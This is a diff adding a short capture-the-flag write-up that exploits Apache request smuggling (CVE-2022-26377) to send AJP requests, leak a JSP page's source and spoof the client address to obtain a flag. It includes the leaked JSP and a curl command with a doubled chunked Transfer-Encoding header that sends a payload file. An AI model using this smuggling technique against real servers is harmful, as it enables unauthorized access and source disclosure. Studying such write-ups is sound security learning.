@@ -1,0 +1,27 @@
+<h1>Where are you from?</h1>
+
+<ol>
+<li>The web server is vulnerable to CVE-2022-26377, which means we can use Request Smuggling to send AJP Requests.</li>
+<li>Following the writeup in <a href="http://noahblog.360.cn/apache-httpd-ajp-request-smuggling/">http://noahblog.360.cn/apache-httpd-ajp-request-smuggling/</a>, we are able to craft a AJP request that allows us to leak the source code (index.jsp).</li>
+</ol>
+
+<p><code>jsp
+&lt;%
+    String remote_addr = request.getRemoteAddr();
+    if (remote_addr.equals("119.29.29.29")){
+        String flag = System.getenv("flag");
+        out.println(flag);
+    }else {
+        out.print(remote_addr);
+    }
+</code></p>
+
+<ol start="3">
+<li>Then, we craft another request where we set the remote_addr to the fake address, and get the flag.</li>
+</ol>
+
+<p>Exploit script: <code>gen.py</code> generates the payload which we can send to the server using the following command:</p>
+
+<p><code>
+curl -vvv http://43.154.50.108:32512/ctf/ -u "username:password" -H 'Transfer-Encoding: chunked, chunked'  --data-binary @payload2
+</code></p>
